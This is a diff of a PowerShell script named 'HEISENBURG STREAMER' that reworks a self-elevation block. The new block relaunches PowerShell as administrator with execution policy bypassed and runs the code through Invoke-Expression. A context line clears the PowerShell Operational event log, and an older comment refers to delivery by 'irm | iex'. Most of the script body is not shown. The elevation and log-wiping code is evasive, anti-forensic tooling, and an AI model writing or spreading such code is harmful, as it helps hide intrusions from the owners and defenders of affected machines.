@@ -1,13 +1,15 @@
 # ========================================================
-# HEISENBURG STREAMER - HYPER-STREAM v7.0 (FINAL)
+# HEISENBURG STREAMER - HYPER-STREAM v7.1 (WORKING)
 # ========================================================
 
-# Self Elevation (Simplified for irm | iex)
+# Self Elevation
+$code = @"
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $PSCommand = "-NoProfile -ExecutionPolicy Bypass -Command `"Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Path + "`"' -Verb RunAs`""
-    Start-Process PowerShell -ArgumentList $PSCommand -Verb RunAs
+    Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "$($MyInvocation.MyCommand.Path)"' -Verb RunAs
     exit
 }
+"@
+Invoke-Expression $code
 
 try {
     [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
@@ -64,5 +66,3 @@ wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
 } catch {
     Write-Host "`n[!] CRITICAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
 }
-
-Remove-Variable * -ErrorAction SilentlyContinue 2>$null
